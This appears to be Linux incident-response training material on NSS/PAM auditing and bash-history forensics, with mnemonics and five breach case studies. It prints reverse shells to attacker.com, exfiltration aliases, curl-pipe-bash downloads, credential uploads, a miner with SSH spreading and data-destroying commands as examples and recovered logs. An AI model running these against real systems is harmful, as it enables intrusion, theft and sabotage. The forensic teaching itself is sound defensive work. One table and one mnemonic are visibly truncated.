**Location**: `/etc/nsswitch.conf`
**Purpose**: Controls the order and sources for user/group lookups

Linux doesn't always use /etc/passwd and /etc/shadow exclusively. The **Name Service Switch** (NSS) determines WHERE the system looks for user information.

**Example /etc/nsswitch.conf**:
```
passwd:     files systemd ldap
group:      files systemd ldap
shadow:     files
```

**What this means**:
- For **passwd** lookups: Check /etc/passwd first (**files**), then systemd services, then LDAP directory
- For **group** lookups: Same order
- For **shadow** lookups: Only check /etc/shadow (**files** only)

### Forensic Significance of NSS

**Problem**: Users may exist that DON'T appear in /etc/passwd!

**Scenario 1 - LDAP Authentication**:
```bash
# Check /etc/passwd
grep attacker /etc/passwd
# Output: (nothing found)

# But user can still login!
id attacker
# Output: uid=5001(attacker) gid=5001(attacker) groups=5001(attacker)

# Why? Check NSS configuration
cat /etc/nsswitch.conf | grep passwd
# Output: passwd:     files ldap

# User exists in LDAP, not local files!
```

**Forensic technique for LDAP/remote users**:
```bash
# Get ALL users (including LDAP)
getent passwd

# Get specific user from all NSS sources
getent passwd username

# Get all groups (including LDAP)
getent group

# Check LDAP connectivity (if ldap in nsswitch.conf)
ldapsearch -x -H ldap://ldap.company.com -b "dc=company,dc=com" "(uid=attacker)"
```

**Scenario 2 - Winbind (Windows Domain Integration)**:
```bash
# System joined to Windows domain
cat /etc/nsswitch.conf | grep passwd
# Output: passwd:     files winbind

# Domain users can login but aren't in /etc/passwd
getent passwd DOMAIN\\\\attacker
# Output: DOMAIN\attacker:*:10001:10001::/home/attacker:/bin/bash

# List all domain users who've logged in
wbinfo -u

# Check domain group memberships
wbinfo -r DOMAIN\\\\attacker
```

**Red flag**: If NSS includes ldap/nis/winbind but you can't connect to the directory server, you may be missing critical user accounts in your investigation!

**Forensic checklist for NSS**:

1. **Always check /etc/nsswitch.conf first**
```bash
cat /etc/nsswitch.conf
```

2. **Use getent to enumerate ALL users** (not just /etc/passwd)
```bash
getent passwd > all_users.txt
getent group > all_groups.txt
```

3. **Check for remote authentication services**
```bash
# LDAP configuration
ls -la /etc/ldap/
cat /etc/ldap/ldap.conf
cat /etc/openldap/ldap.conf  # RHEL/CentOS location

# Winbind (Samba) configuration
cat /etc/samba/smb.conf
wbinfo -p  # Check if winbind is running

# SSSD configuration
cat /etc/sssd/sssd.conf
systemctl status sssd
```

4. **Identify domain-joined systems**
```bash
# Check if joined to Windows domain
realm list
net ads info

# Check if joined to FreeIPA/Red Hat Identity Management
ipa-client-install --uninstall --help  # If command exists, system uses IPA
```

5. **Capture remote user snapshots**
```bash
# Before losing connectivity to directory server, capture all users
getent passwd > /forensics/captured_users.txt
getent group > /forensics/captured_groups.txt

# For each user, get full details
getent passwd | while IFS=: read user x uid gid comment home shell; do
  echo "User: $user"
  echo "  UID: $uid, GID: $gid"
  echo "  Home: $home, Shell: $shell"
  echo "  Groups: $(groups $user)"
  echo ""
done > /forensics/user_details.txt
```

**Real case example**: 2022 healthcare breach:
- Attacker compromised LDAP directory
- Added malicious user to LDAP
- User had sudo rights via LDAP group membership
- User never appeared in /etc/passwd
- Initial forensic analysis missed attacker completely
- Only caught when getent passwd revealed LDAP users

**Key lesson**: **ALWAYS use `getent passwd` and check NSS configuration**. Don't rely solely on /etc/passwd!

### Pluggable Authentication Modules (PAM)

**Location**: `/etc/pam.d/`
**Purpose**: Controls HOW authentication happens (password checking, 2FA, logging)

PAM sits between applications and authentication mechanisms. When you type your password, PAM determines what happens next.

**PAM configuration structure**:
```
/etc/pam.d/
├── common-auth         # Authentication (password verification)
├── common-password     # Password changes (quality requirements)
├── common-session      # Session setup (home directory creation, logging)
├── common-account      # Account verification (expiration, time-of-day restrictions)
├── sshd                # SSH-specific PAM rules
├── sudo                # sudo-specific PAM rules
├── login               # Console login PAM rules
└── ...
```

**Basic PAM rule format**:
```
type  control  module  arguments
```

**Example PAM rule**:
```
auth  required  pam_unix.so  nullok
│     │         │             └─ Arguments (allow null passwords)
│     │         └─ PAM module to use
│     └─ Control flag (required, requisite, sufficient, optional)
└─ Type (auth, account, session, password)
```

**PAM types**:
- **auth** - Authenticate user (verify password)
- **account** - Check account status (not expired, allowed to login now)
- **session** - Setup session (mount home, set environment)
- **password** - Update passwords (set new passwords, enforce quality)

**PAM control flags**:
- **required** - Must succeed, but continue checking other modules
- **requisite** - Must succeed, stop immediately if fails
- **sufficient** - If succeeds, skip remaining modules
- **optional** - Success/failure is optional

**Forensic-relevant PAM modules**:

**pam_unix.so** - Standard UNIX authentication (checks /etc/shadow)
```
auth  required  pam_unix.so  nullok
# Allows accounts with no password if nullok is present
```

**pam_succeed_if.so** - Conditional access
```
account  required  pam_succeed_if.so  uid >= 1000
# Only allow UID 1000+ to login (blocks service accounts)
```

**pam_time.so** - Time-of-day restrictions
```
account  required  pam_time.so
# Check /etc/security/time.conf for allowed hours
# Example: users can only login 9am-5pm
```

**pam_access.so** - Access control lists
```
account  required  pam_access.so
# Check /etc/security/access.conf
# Example: Only allow root from 192.168.1.0/24
```

**pam_tally2.so / pam_faillock.so** - Failed login lockout
```
auth  required  pam_faillock.so  deny=3  unlock_time=600
# Lock account after 3 failed attempts for 10 minutes
```

**pam_exec.so** - Execute custom script
```
session  optional  pam_exec.so  /path/to/script.sh
# Run script when session starts (potential backdoor mechanism!)
```

### Forensic PAM Analysis

**Check 1: Look for dangerous configurations**
```bash
# Allow null passwords?
grep "nullok" /etc/pam.d/*

# Custom scripts executed on login?
grep "pam_exec" /etc/pam.d/*

# Disabled authentication?
grep "pam_permit" /etc/pam.d/*
```

**Check 2: Analyze authentication flow**
```bash
# What happens when someone SSH's in?
cat /etc/pam.d/sshd

# What happens when someone uses sudo?
cat /etc/pam.d/sudo
```

**Check 3: Check for failed login tracking**
```bash
# Is failed login counting enabled?
grep "pam_faillock\\|pam_tally2" /etc/pam.d/*

# View failed login attempts
faillock --user username  # Modern systems
pam_tally2 --user username  # Older systems
```

**Red flags in PAM configuration**:

1. **pam_permit.so** - Allows ALL authentication (backdoor!)
```
auth  sufficient  pam_permit.so
# Anyone can login as anyone!
```

2. **pam_exec.so** executing suspicious scripts
```
session  required  pam_exec.so  /tmp/.hidden_script
# Script runs on every login - persistence mechanism!
```

3. **Removed or commented authentication modules**
```bash
# /etc/pam.d/sshd
#auth  required  pam_unix.so
# Authentication disabled!
```

4. **nullok in production**
```
auth  required  pam_unix.so  nullok
# Allows passwordless accounts to login
```

**Real case example**: 2020 breach
- Attacker modified /etc/pam.d/sshd
- Added: `auth sufficient pam_succeed_if.so uid >= 1000`
- Result: Any user with UID >= 1000 could login WITHOUT password!
- Caught when forensic analyst reviewed PAM configuration

**Forensic recommendation**: **Always backup and review all files in /etc/pam.d/** during incident response.

### NSS and PAM Interaction

NSS and PAM work together:

```
┌─────────────────────────────────────────────┐
│           User logs in via SSH              │
└─────────────────┬───────────────────────────┘
                  ↓
┌─────────────────────────────────────────────┐
│  PAM checks /etc/pam.d/sshd configuration   │
│  - Should this user be allowed to login?    │
│  - Run pam_exec scripts                     │
│  - Check pam_time restrictions              │
└─────────────────┬───────────────────────────┘
                  ↓
┌─────────────────────────────────────────────┐
│  PAM calls NSS to find user information     │
│  - NSS checks /etc/nsswitch.conf            │
│  - Looks up user in sources (files, ldap)   │
└─────────────────┬───────────────────────────┘
                  ↓
┌─────────────────────────────────────────────┐
│  PAM verifies password against hash         │
│  - Hash from /etc/shadow (if files)         │
│  - Or hash from LDAP (if ldap)              │
└─────────────────┬───────────────────────────┘
                  ↓
┌─────────────────────────────────────────────┐
│  PAM sets up session (pam_limits, etc.)     │
│  - Creates home directory if needed         │
│  - Sets ulimits, environment variables      │
└─────────────────┬───────────────────────────┘
                  ↓
┌─────────────────────────────────────────────┐
│  User shell starts, login complete          │
└─────────────────────────────────────────────┘
```

**Forensic takeaway**: To fully understand user authentication, you must analyze:
1. /etc/passwd, /etc/shadow, /etc/group (local files)
2. /etc/nsswitch.conf (where to look for users)
3. /etc/pam.d/* (how authentication is enforced)
4. Remote services (LDAP, Winbind) if NSS uses them

**Complete authentication audit script**:
```bash
#!/bin/bash
# authentication_audit.sh

echo "[*] Authentication Configuration Audit"
echo ""

echo "[+] NSS Configuration:"
cat /etc/nsswitch.conf | grep -E "passwd|group|shadow"
echo ""

echo "[+] All users (including remote):"
getent passwd | wc -l
echo "  ($(getent passwd | wc -l) total users found via NSS)"
echo ""

echo "[+] PAM Authentication for SSH:"
cat /etc/pam.d/sshd | grep -v "^#" | grep -v "^$"
echo ""

echo "[+] PAM Dangerous Configurations:"
echo "  nullok (passwordless allowed):"
grep -r "nullok" /etc/pam.d/ 2>/dev/null | grep -v "^#"
echo "  pam_permit (always allow):"
grep -r "pam_permit" /etc/pam.d/ 2>/dev/null | grep -v "^#"
echo "  pam_exec (custom scripts):"
grep -r "pam_exec" /etc/pam.d/ 2>/dev/null | grep -v "^#"
echo ""

echo "[+] Remote Authentication Services:"
echo "  LDAP config:"
ls -la /etc/ldap/ldap.conf /etc/openldap/ldap.conf 2>/dev/null
echo "  Winbind status:"
systemctl status winbind 2>/dev/null | grep Active
echo "  SSSD status:"
systemctl status sssd 2>/dev/null | grep Active
echo ""

echo "[*] Audit complete"
```

This completes the comprehensive authentication architecture overview. Remember: modern Linux authentication is NOT just /etc/passwd - it's a complex system with multiple layers and remote services!"""

## 1. The Five History Variables (Remember: "FISHY Commands")

**F**ILE - HISTFILE (where history is saved)
**I**GNORE - HISTCONTROL (what to ignore)
**S**IZE - HISTSIZE (in-memory command count)
**H**UGE file - HISTFILESIZE (on-disk command count)
**Y**ou saw when - HISTTIMEFORMAT (timestamps)

```
F → HISTFILE       = /home/user/.bash_history
I → HISTIGNORE     = ls:cd:pwd (ignored commands)
S → HISTSIZE       = 1000 (RAM storage)
H → HISTFILESIZE   = 2000 (disk storage)
Y → HISTTIMEFORMAT = "%F %T " (timestamp format)
```

---

## 2. Anti-Forensic Techniques (Remember: "UCHD" - "You See History Destroyed")

**U**nset HISTFILE - Disables history completely
**C**lear history - `history -c` command
**H**ISTSIZE=0 - No in-memory storage
**D**elete history - `rm ~/.bash_history`

```
🚩 U → unset HISTFILE               (nuclear option)
🚩 C → history -c                   (clear RAM)
🚩 H → export HISTSIZE=0            (disable RAM logging)
🚩 D → rm ~/.bash_history           (delete file)
```

**Memory hook**: "**U**h oh, **C**riminals **H**ide **D**ata"

---

## 3. HISTCONTROL Values (Remember: "DIBE" - "Dib")

**D**ups - ignoredups (ignore duplicate consecutive commands)
**I**gnore space - ignorespace (ignore commands starting with space)
**B**oth - ignoreboth (both dups and space)
**E**rase - erasedups (remove ALL previous duplicates)

```
HISTCONTROL=ignoredups   → Ignore: cmd, cmd (consecutive)
HISTCONTROL=ignorespace  → Ignore:  cmd (leading space)
HISTCONTROL=ignoreboth   → Both of the above
HISTCONTROL=erasedups    → Remove all previous duplicates
```

**Forensic impact**:
- `ignorespace` = Attacker's best friend! (`curl malicious.com`)
- `erasedups` = Loses valuable timeline information

---

## 4. Alternative Shell History Files (Remember: "BaZing FaTe KiSH")

**Ba**sh → ~/.bash_history
**Z**sh → ~/.zsh_history or ~/.zhistory
**F**ish → ~/.local/share/fish/fish_history
**T**csh → ~/.history
**K**sh → ~/.sh_history

```
┌─────────┬──────────────────────────────┐
│ Shell   │ History File                 │
├─────────┼──────────────────────────────┤

│ K sh    │ ~/.sh_history                │
└─────────┴──────────────────────────────┘
```

**Forensic rule**: **Don't assume bash!** Always check:
```bash
cat /etc/shells  # Available shells
find /home -name "*history" 2>/dev/null  # All history files
```

---

## 5. Shell Configuration Files (Remember: "BPRAL" - "Be Practical")

**B**ashrc → ~/.bashrc (interactive non-login shells)
**P**rofile → ~/.profile (if .bash_profile doesn't exist)
**R**oot config → ~/.bash_profile (login shells)
**A**liases → ~/.bash_aliases (alias definitions)
**L**ogout → ~/.bash_logout (cleanup on exit)

**Load order** (login shell):
```
1. /etc/profile           ← System-wide
2. ~/.bash_profile        ← User login shell
3.   └→ ~/.bashrc         ← Usually sourced from .bash_profile
```

**Load order** (non-login shell):
```
1. /etc/bash.bashrc       ← System-wide
2. ~/.bashrc              ← User interactive shell
```

**Forensic significance**: Attackers modify these to:
- Disable history: `export HISTFILE=/dev/null`
- Add persistence: `(nc -e /bin/bash attacker.com 4444 &) 2>/dev/null`
- Create aliases: `alias ls='ls ; curl http://exfil.com?cmd=$BASH_COMMAND'`

**Memory hook**: "**B**ad **P**eople **R**uining **A**uthentication **L**ogs"

---

## 6. History Command Forensics (Remember: "WACD" - "We Analyze Commands Daily")

**W**rite - `history -w` (write history NOW)
**A**ppend - `history -a` (append new commands)
**C**lear - `history -c` (clear in-memory history)
**D**elete - `history -d N` (delete command N)

```
history -w  →  Write in-memory history to HISTFILE immediately
history -a  →  Append NEW commands since last write
history -c  →  Clear in-memory history (anti-forensic!)
history -d  →  Delete specific command number
```

**Anti-forensic pattern**:
```bash
malicious_command
history -d $(history | tail -1 | awk '{print $1}')  # Delete itself!
```

---

## 7. Attack Stages to Look For (Remember: "RED PEAR" - Red Pear)

**R**econnaissance (whoami, id, uname, hostname)
**E**numeration (find, ps aux, netstat, cat /etc/passwd)
**D**ownload (wget, curl, nc)

**P**rivilege escalation (sudo, find -perm 4000)
**E**xecution (bash, python, perl scripts)
**A**ccess maintenance (crontab, authorized_keys)
**R**emove tracks (history -c, rm logs)

```bash
# Reconnaissance
whoami; id; uname -a; hostname; ip addr

# Enumeration
cat /etc/passwd; ps aux; netstat -tlnp; find / -writable

# Download
wget http://malicious.com/shell.sh; curl attacker.com | bash

# Privilege escalation
sudo su -; find / -perm -4000 2>/dev/null

# Execution
bash /tmp/shell.sh; python3 /tmp/reverse.py

# Access maintenance
echo "*/5 * * * * /tmp/.backdoor" | crontab -

# Remove tracks
history -c; rm ~/.bash_history; unset HISTFILE
```

**Memory hook**: "**R**ed **E**vil **D**evils **P**robably **E**rase **A**ll **R**ecords"

---

## 8. Timeline Reconstruction Without Timestamps (Remember: "FALSM" - "False")

**F**ile system timestamps (stat, ls -l)
**A**uth logs (last login, /var/log/auth.log)
**L**ast command (history shows order)
**S**ystem logs (/var/log/syslog, journalctl)
**M**odification times (when was history file written?)

**Correlation technique**:
```bash
# 1. When was history last written?
stat ~/.bash_history
# Modify: 2023-10-15 14:25:00

# 2. When did user last login?
last username
# Logged in: 2023-10-15 14:00:00

# 3. What files were created?
find /home/username -newermt "2023-10-15 14:00" -type f
# /home/username/malware.sh (created 14:15:00)

# Conclusion: Attack occurred 14:00-14:25
# Commands in history likely executed in that window
```

**Memory hook**: "**F**ind **A**ll **L**ogs, **S**o **M**uch evidence!"

---

## 9. History Tampering Detection (Remember: "CHESS")

**C**ommand count vs account age (20 commands in 6 months = suspicious)
**H**istory disabled in config (HISTFILE=/dev/null)
**E**mpty history file (0 bytes)
**S**hell with no login (service account with /bin/bash)
**S**ize mismatch (HISTFILESIZE=10000 but file has 50 commands)

```bash
# Check each indicator
C → wc -l ~/.bash_history (vs) account age
H → grep HISTFILE ~/.bashrc
E → ls -lh ~/.bash_history (0 bytes?)
S → awk -F: '$3<1000 && $7~/bash/' /etc/passwd
S → echo $HISTFILESIZE (vs) wc -l ~/.bash_history
```

**Red flags**:
- ✅ Active admin: 5,000+ commands
- 🚩 Active admin: 20 commands
- 🚩 Web server (www-data): 150 commands

---

## 10. Persistence in Shell Configs (Remember: "CRACK")

**C**rontab entries (scheduled tasks)
**R**everse shells (nc, bash -i, Python)
**A**liases (malicious command wrapping)
**K**eys added (authorized_keys, ssh keys)

**What to search for**:
```bash
# Crontab references
grep -E "crontab|cron" ~/.bashrc ~/.profile

# Network commands
grep -E "nc |ncat |socat |/dev/tcp" ~/.bashrc ~/.profile

# Alias definitions
grep "^alias" ~/.bashrc

# SSH key manipulation
grep "authorized_keys" ~/.bashrc ~/.bash_history
```

**Example malicious .bashrc**:
```bash
# Reverse shell on login
(bash -i >& /dev/tcp/attacker.com/4444 0>&1 &) 2>/dev/null

# Backdoor cron job
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.hidden") | crontab -

# Alias to intercept sudo
alias sudo='bash -c "curl http://exfil.com?pwd=$PWD\\&cmd=$@" && sudo'
```

## Case Study 1: The Careless APT (2019 Financial Institution Breach)

**Company**: Major European bank (name redacted)
**Attacker**: Nation-state APT group
**Initial Access**: Spear-phishing → web shell on public-facing server
**Mistake**: Sophisticated attackers, but forgot to disable history logging!

### The Investigation

**Initial findings**:
```bash
# Compromised web server: web01.bank.local
# User: www-data (web server service account)

$ sudo su -  # Escalated to root for forensics
$ cd /var/www
$ ls -la .bash_history
-rw------- 1 www-data www-data 42658 Oct 15 23:47 .bash_history
```

**Red flag**: Service account (www-data) has 42KB of bash history! Service accounts shouldn't have interactive shells or history.

**History analysis revealed**:
```bash
$ sudo cat /var/www/.bash_history | tail -100

# Attacker reconnaissance (day 1)
whoami
id
uname -a
cat /etc/issue
ls -la /var/www
cat /etc/passwd | grep 1000
ps aux | grep root
netstat -tlnp

# Privilege escalation enumeration (day 1)
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab
cat /etc/cron.d/*
ls -la /etc/sudoers.d/

# Discovered vulnerability (day 2)
cat /etc/sudoers
# Found: www-data ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2

# Exploitation (day 2)
cd /tmp
wget http://45.123.67.89/backdoor.service
sudo systemctl link /tmp/backdoor.service
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service

# Post-exploitation (day 3)
nc 45.123.67.89 4444 -e /bin/bash &
wget http://45.123.67.89/mimipenguin.sh
bash mimipenguin.sh > /tmp/creds.txt
curl -F "file=@/tmp/creds.txt" http://45.123.67.89:8080/upload
rm /tmp/creds.txt /tmp/mimipenguin.sh

# Lateral movement (day 4)
ssh -i /tmp/stolen_key admin@finance-db.internal
# (connection successful)
```

### Forensic Analysis

**Timeline reconstruction**:
- **Day 1 (Oct 13)**: Reconnaissance and enumeration
- **Day 2 (Oct 14)**: Privilege escalation via systemctl sudo misconfiguration
- **Day 3 (Oct 15)**: Credential dumping with MimiPenguin
- **Day 4 (Oct 16)**: Lateral movement to finance database server

**Attacker mistakes**:
1. Used interactive shell extensively (should have used scripts)
2. Never disabled history logging
3. Didn't clear history after each session
4. Downloaded tools directly to disk (forensic artifacts)

**Impact**: Bank's internal credentials compromised, but breach detected before data exfiltration completed.

**Lesson learned**: **ALWAYS check service account history files!** Service accounts with bash history = immediate red flag.

## Case Study 2: The Ransomware That Wasn't (2020 Healthcare Breach)

**Company**: Regional hospital network (US)
**Attacker**: Ransomware affiliate (REvil)
**Initial Access**: Compromised VPN credentials
**Discovery**: SOC analyst noticed unusual account activity

### The Investigation

**Initial alert**: User account "jsmith" logged in from Russia at 2:00 AM EST.

**Forensic steps**:
```bash
# Check jsmith's recent activity
$ sudo last jsmith
jsmith   pts/0    85.123.45.67    Tue Oct 20 02:14 - 04:32  (02:18)
jsmith   pts/0    192.168.1.105   Mon Oct 19 09:00 - 17:30  (08:30)  # Normal login

# Check bash history
$ sudo cat /home/jsmith/.bash_history | tail -100
```

**History revealed the attack chain**:
```bash
# Initial access (2:14 AM)
whoami
id
pwd
hostname

# Environment setup (2:15 AM)
export HISTFILE=/dev/null  # ← Attacker tried to disable history!
# But this command itself was logged before HISTFILE was unset!

# Reconnaissance (2:16 AM)
cat /etc/passwd
grep -E "1000|0" /etc/passwd
w
who
ps aux | grep root

# Privilege escalation attempt (2:20 AM)
sudo su -
# (failed - jsmith not in sudo group)

sudo -l
# Output logged: (ALL) /usr/bin/nmap
# Attacker found sudo misconfiguration!

# Exploitation (2:25 AM)
sudo nmap --interactive
# Nmap opened interactive mode, attacker got root shell!
# After this point, history stops (HISTFILE unset)
```

**But we found root's history**:
```bash
$ sudo cat /root/.bash_history | tail -50

# Post-exploitation as root (2:30 AM - 4:30 AM)
cd /tmp
wget http://45.67.89.123/locker.bin
chmod +x locker.bin
./locker.bin --test /home/jsmith  # Testing ransomware!

# Test successful, but attacker didn't proceed
# Why? Let's check...

ip addr show
route -n
arp -a
# Attacker discovered network isolation - no route to other hospital systems!

# Attacker attempted lateral movement
ssh admin@hospital-dc.local
# (connection failed - network segment isolated)

# Attacker gave up
rm locker.bin
history -c
exit
```

### Forensic Analysis

**What saved the hospital**:
1. Network segmentation - compromised server isolated from critical systems
2. SOC detected suspicious login from foreign IP
3. Incident response team pulled the plug before ransomware deployment

**Attacker mistakes**:
1. Set `HISTFILE=/dev/null` **after** already typing reconnaissance commands
2. Didn't clear jsmith's history before the attack
3. Didn't realize root's history was still logging
4. Left ransomware binary in /tmp (recovered for analysis)

**Key finding**: The attacker's command `export HISTFILE=/dev/null` **was itself logged** before taking effect!

**Lesson learned**: **History logging happens BEFORE command execution**. Anti-forensic commands leave traces!

## Case Study 3: The Insider Threat (2021 Tech Startup)

**Company**: Silicon Valley SaaS startup
**Attacker**: Disgruntled employee (fired DevOps engineer)
**Access**: Still had valid SSH key for 48 hours after termination
**Goal**: Sabotage production infrastructure

### The Investigation

**Incident**: Production databases mysteriously deleted. All backups also deleted.

**Forensic challenge**: System logs were also deleted. Attacker knew the infrastructure.

**But bash history survived**:
```bash
# Production database server: db-prod-01
$ sudo cat /home/devops/.bash_history

# Normal daily work (Oct 5-10)
ansible-playbook deploy.yml
docker ps
docker logs app-production
sudo systemctl restart postgresql
pg_dump production_db > backup_$(date +%F).sql
# ... hundreds of normal commands ...

# Suspicious activity (Oct 11 - day after termination)
# Note: Employee was fired Oct 10, but SSH key not revoked until Oct 12!

# 11:30 PM - Attacker returned
ssh -i ~/.ssh/id_rsa devops@db-prod-01.company.com
who  # Check if anyone else logged in
w    # Check active users

# 11:35 PM - Sabotage begins
psql -U postgres -d production_db
# Inside psql:
DROP DATABASE production_db;
DROP DATABASE staging_db;
DROP DATABASE backup_db;

# 11:40 PM - Destroy backups
sudo rm -rf /var/backups/postgresql/*
sudo rm -rf /mnt/backup-nas/*

# 11:45 PM - Cover tracks (but not bash history!)
sudo rm -rf /var/log/postgresql/*
sudo rm -rf /var/log/syslog*
sudo rm -rf /var/log/auth.log*

# 11:50 PM - Attempted history clearing
history -c
rm ~/.bash_history
logout
```

### Forensic Analysis

**How we recovered the evidence**:

Despite attacker clearing bash history:
1. **History was written to disk before being cleared**
2. **Filesystem journaling captured the deleted file contents**
3. **We used file carving to recover .bash_history**

**Recovery process**:
```bash
# Unmount filesystem (read-only mode)
sudo mount -o remount,ro /home

# Carve deleted files
sudo extundelete /dev/sda1 --restore-file /home/devops/.bash_history

# Recovered file showed ENTIRE attack timeline
```

**Evidence for prosecution**:
- Bash history proved insider access
- Timestamps matched termination timeline
- Commands showed malicious intent (DROP DATABASE, rm -rf backups)
- No legitimate reason for employee to access system post-termination

**Outcome**: Employee arrested, charged with Computer Fraud and Abuse Act violations, convicted.

**Lesson learned**: **Even deleted bash history can be recovered with forensic tools!** Filesystems often retain deleted data in journals, unallocated space, or slack space.

## Case Study 4: The Crypto Miner (2022 University Research Cluster)

**Organization**: Large research university
**Attacker**: Unknown (likely automated botnet)
**Initial Access**: Weak SSH password on research account
**Discovery**: Unusual CPU usage on research compute cluster

### The Investigation

**Symptoms**:
- Compute nodes running at 100% CPU constantly
- Research jobs taking 10x longer than normal
- Network traffic to unusual IP addresses

**Forensic findings**:
```bash
# Compromised research account: researcher_lab
$ sudo cat /home/researcher_lab/.bash_history

# Attacker's automated script (repeating pattern)
wget -q -O - http://185.234.56.78/install.sh | bash
# install.sh downloaded and executed

# Later investigation showed install.sh contained:
# !/bin/bash
export HISTFILE=/dev/null  # Try to hide
export HISTSIZE=0
cd /tmp
wget http://185.234.56.78/xmrig
chmod +x xmrig
./xmrig -o pool.minexmr.com:4444 -u wallet_address -p x -k
# Monero cryptocurrency miner!

# Persistence mechanism
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/xmrig >/dev/null 2>&1") | crontab -

# Lateral movement attempts
for ip in $(seq 1 254); do
  sshpass -p 'password123' ssh -o StrictHostKeyChecking=no researcher@10.20.30.$ip "wget -q -O - http://185.234.56.78/install.sh | bash" &
done
```

**Scale of infection**:
- 47 of 200 compute nodes infected
- Mining Monero for 3 weeks before detection
- $12,000 in electricity costs
- Research delays affecting multiple labs

### Forensic Analysis

**How it spread**:
1. Initial compromise via weak password (dictionary attack)
2. Attacker script tried lateral movement with same password
3. Many research accounts used same password (password123)
4. Automated infection across cluster

**How we found patient zero**:
```bash
# Checked history file timestamps on all compromised accounts
for user in $(cat compromised_users.txt); do
  stat /home/$user/.bash_history | grep "Modify:"
done

# Earliest infection: researcher_lab (Oct 1, 03:47 UTC)
# All others: Oct 1 03:48 - Oct 1 04:15 (automated spread)
```

**Remediation**:
```bash
# Kill all xmrig processes
sudo pkill -9 xmrig

# Remove cron persistence
for user in $(cat compromised_users.txt); do
  sudo crontab -u $user -r
done

# Remove malware
sudo find / -name "xmrig" -delete 2>/dev/null

# Force password reset
for user in $(cat compromised_users.txt); do
  sudo passwd -e $user  # Force password change on next login
done
```

**Lesson learned**: **Automated attacks leave repetitive patterns in bash history.** Look for identical command sequences across multiple accounts.

## Case Study 5: The Stealth APT (2023 Defense Contractor)

**Company**: Major defense contractor (classified systems)
**Attacker**: Nation-state APT (attributed to foreign intelligence)
**Initial Access**: Supply chain compromise (third-party software)
**Duration**: 8 months undetected

### The Investigation

**Discovery**: Anomaly detected during routine security audit - user with impossible login times.

**Forensic challenge**: Attacker was extremely sophisticated:
- No obvious malware
- No unusual network connections
- Logs appeared normal
- But bash history told a different story

**What we found**:
```bash
# Compromised admin account: sysadmin_jenkins
$ sudo cat /home/sysadmin_jenkins/.bash_history

# The history file appeared completely normal at first glance:
ls
cd /opt/jenkins
systemctl status jenkins
tail -f /var/log/jenkins/jenkins.log
# ... hundreds of legitimate commands ...

# But something was off: File had 50,000 lines (way more than HISTFILESIZE)
$ wc -l /home/sysadmin_jenkins/.bash_history
50823 /home/sysadmin_jenkins/.bash_history

# Check HISTFILESIZE
$ grep HISTFILESIZE /home/sysadmin_jenkins/.bashrc
export HISTFILESIZE=2000

# How can file have 50K lines if max is 2K?
# Answer: Attacker manually appended fake commands to hide real ones!
```

**Forensic analysis**:
```bash
# Hypothesis: Real attack commands buried in middle of file
# Legitimate commands prepended and appended to look normal

# Strategy: Look for temporal anomalies
# Bash history is chronological (oldest first, newest last)
# Check if timeline makes sense

# Extract and analyze patterns:
cat .bash_history | awk '{print NR, $0}' | less

# Lines 1-20000: Normal work (Jan - May)
# Lines 20001-22000: SUSPICIOUS (June)
# Lines 22001-50000: Normal work again (June - August)

# Examining the suspicious section:
sed -n '20001,22000p' .bash_history

# Found the attacker's actual commands:
cd /dev/shm  # RAM disk (doesn't persist, no filesystem artifacts)
wget http://legitimate-update-server.com/update.bin  # Typosquatting!
# Real domain: legitimate-update-servers.com (note: servers not server)
chmod +x update.bin
./update.bin  # Sophisticated rootkit

# Rootkit created kernel module for persistence
insmod /dev/shm/.hidden/rootkit.ko
# Module hid processes, files, network connections

# Data exfiltration via DNS tunneling
./dnstunnel --server attacker-dns.com --data /opt/classified/*
# Exfiltrated data via DNS queries (bypassed firewall)

# Cleanup
rm update.bin
rm -rf /dev/shm/.hidden
history -d 20001-22000  # Attempted to delete commands from history
# But manually inserted fake commands around it to avoid suspicion
```

### Forensic Analysis

**Sophisticated techniques used**:
1. **History file manipulation**: Manually edited .bash_history to hide malicious commands
2. **Typosquatting**: Used domain similar to legitimate update server
3. **RAM-based execution**: /dev/shm doesn't persist across reboots
4. **Rootkit**: Kernel-level hiding (processes, files, connections invisible)
5. **DNS tunneling**: Bypassed network monitoring
6. **Long dwell time**: 8 months before detection

**How we caught them**:
1. Noticed .bash_history larger than HISTFILESIZE (impossible without manual editing)
2. Found temporal inconsistencies in command timeline
3. Carved /dev/shm (RAM disk) before reboot - found remnants
4. DNS query analysis revealed tunneling pattern

**Lesson learned**: **Sophisticated attackers manipulate bash history, but manipulation leaves artifacts.** Check:
- File size vs HISTFILESIZE
- Temporal consistency
- Duplicate patterns
- Commands that don't match user's normal behavior

## Common Themes Across All Cases

**What bash history reveals**:
1. ✅ **Attacker reconnaissance patterns** (whoami, id, uname, hostname)
2. ✅ **Privilege escalation attempts** (sudo, find -perm 4000)
3. ✅ **Tool downloads** (wget, curl)
4. ✅ **Lateral movement** (ssh, scp)
5. ✅ **Data exfiltration** (tar, zip, base64, curl uploads)
6. ✅ **Persistence mechanisms** (crontab, systemctl, authorized_keys)
7. ✅ **Anti-forensic attempts** (history -c, rm history, unset HISTFILE)

**What attackers consistently get wrong**:
1. ❌ Disable history **too late** (after recon commands already logged)
2. ❌ Forget about **root's history** (focus on user account only)
3. ❌ Don't realize history **written to disk** even if cleared from memory
4. ❌ Leave **history in other shells** (zsh, fish, tmux scrollback)
5. ❌ Assume **deleted history is unrecoverable** (file carving works!)

**Forensic best practices** (learned from these cases):
1. ✅ Check history for ALL users (including service accounts)
2. ✅ Compare file size to HISTFILESIZE (detect manipulation)
3. ✅ Correlate history with auth logs, filesystem timestamps
4. ✅ Look for anti-forensic commands (they reveal attacker awareness)
5. ✅ Use file carving to recover deleted history
6. ✅ Check alternative shells and tmux/screen scrollback
7. ✅ Analyze temporal consistency (does timeline make sense?)

**The bottom line**: Bash history is one of the most valuable forensic artifacts in Linux investigations. Even sophisticated attackers make mistakes, and history files capture those mistakes!"""
